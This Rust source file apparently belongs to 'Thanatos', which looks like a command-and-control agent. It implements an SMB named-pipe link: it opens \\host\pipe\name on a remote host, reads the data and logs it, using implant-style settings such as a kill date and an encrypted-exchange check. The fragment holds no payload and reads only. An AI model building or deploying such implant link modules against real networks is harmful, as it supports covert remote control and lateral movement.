use std::fs::OpenOptions;
use std::io::Read;
use std::os::windows::prelude::*;

use super::LinkConnectionInfo;
use agent_utils::errors::ThanatosError;
use serde::Deserialize;

#[derive(Deserialize, Debug)]
pub struct SmbParameters {
    pipename: String,
    killdate: String,
    encrypted_exchange_check: String,
}

pub fn connect(host: String, parameters: &SmbParameters) -> Result<(), ThanatosError> {
    let pipename = format!(r"\\{}\pipe\{}", host, parameters.pipename);

    agent_utils::log!("{}", &pipename);

    let mut pipe = agent_utils::debug_invoke!(
        OpenOptions::new()
            .read(true)
            .write(true)
            .create_new(false)
            .open(pipename),
        ThanatosError::os_error()
    );

    let mut buffer = Vec::new();
    agent_utils::debug_invoke!(pipe.read_to_end(&mut buffer), ThanatosError::os_error());

    agent_utils::log!("{:?}", buffer);

    Ok(())
}
